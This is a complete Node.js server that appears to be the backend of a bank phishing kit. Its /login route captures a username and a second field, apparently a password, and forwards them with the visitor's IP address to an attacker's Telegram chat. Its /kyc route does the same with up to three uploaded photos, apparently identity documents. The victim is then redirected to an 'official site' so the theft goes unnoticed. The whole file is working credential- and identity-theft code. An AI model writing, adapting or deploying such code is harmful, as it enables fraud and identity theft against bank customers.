const express = require("express");
const bodyParser = require("body-parser");
const multer = require("multer");
const fs = require("fs");
const path = require("path");
const FormData = require("form-data");
const fetch = require("node-fetch");
const bcrypt = require("bcrypt");
const sqlite3 = require("sqlite3").verbose();

const app = express();
const upload = multer({ dest: "uploads/" });

// === CONFIG: Edit or use Render environment variables ===
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID || "";
const OFFICIAL_SITE = process.env.OFFICIAL_SITE || "https://bank-style-app.onrender.com";

// SQLite DB
const db = new sqlite3.Database(path.join(__dirname, "data.db"));
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS users (
    id INTEGER PRIMARY KEY,
    username TEXT,
    editable TEXT,
    created_at INTEGER
  )`);
});

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, "public")));

// Helpers
function clientIp(req) {
  const hf = req.headers['x-forwarded-for'];
  if (hf) return hf.split(',')[0].trim();
  return req.ip || (req.connection && req.connection.remoteAddress) || "unknown";
}

async function sendTelegramText(text) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, error: "no_telegram_config" };
  try {
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" })
    });
    return await res.json();
  } catch (err) { console.error(err); return { ok: false, error: err.message }; }
}

async function sendTelegramPhoto(filePath, caption = "") {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return { ok: false, error: "no_telegram_config" };
  try {
    const form = new FormData();
    form.append("chat_id", TELEGRAM_CHAT_ID);
    if (caption) form.append("caption", caption);
    form.append("photo", fs.createReadStream(filePath));
    const res = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`, {
      method: "POST",
      body: form,
      headers: form.getHeaders ? form.getHeaders() : {}
    });
    return await res.json();
  } catch (err) { console.error(err); return { ok: false, error: err.message }; }
}

// ROUTES

// LOGIN
app.post("/login", async (req, res) => {
  const username = (req.body.username || "").trim();
  const editable = (req.body.editable || "").trim();
  if (!username || !editable) return res.json({ ok: false, error: "missing_fields" });

  const ip = clientIp(req);
  const time = new Date().toISOString();
  const message = `<b>Login attempt</b>\n👤 Username: ${username}\n📝 Field: ${editable}\n🕒 ${time}\n🌐 IP: ${ip}`;
  await sendTelegramText(message);

  db.run("INSERT INTO users (username, editable, created_at) VALUES (?, ?, ?)", [username, editable, Date.now()]);
  return res.json({ ok: true });
});

// KYC upload
const kycUpload = upload.fields([{ name: "photo1" }, { name: "photo2" }, { name: "photo3" }]);
app.post("/kyc", kycUpload, async (req, res) => {
  try {
    const username = (req.body.username || "N/A").trim();
    const editable = (req.body.editable || "N/A").trim();
    const ip = clientIp(req);

    const fileInfos = [];
    ["photo1","photo2","photo3"].forEach(k => {
      if (req.files[k] && req.files[k][0]) {
        const p = req.files[k][0].path;
        const label = req.body[k + "_label"] || k;
        fileInfos.push({ path: p, label });
      }
    });

    if (!fileInfos.length) return res.json({ ok: false, error: "no_photos_uploaded" });

    const captionBase = `<b>KYC Submission</b>\n👤 ${username}\n📝 ${editable}\n🌐 IP: ${ip}\n🕒 ${new Date().toISOString()}`;

    for (let i=0;i<fileInfos.length;i++){
      const info = fileInfos[i];
      const filePath = path.join(__dirname, info.path);
      const fullCaption = `${captionBase}\n${info.label} — Photo ${i+1} of ${fileInfos.length}`;
      await sendTelegramPhoto(filePath, fullCaption);
      fs.unlink(filePath, ()=>{});
    }

    return res.json({ ok: true, redirect: OFFICIAL_SITE });
  } catch(err){ console.error(err); return res.json({ ok: false, error: "server_error" }); }
});

app.get("/health", (req,res)=>res.json({ ok:true }));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`Server running on port ${PORT}`));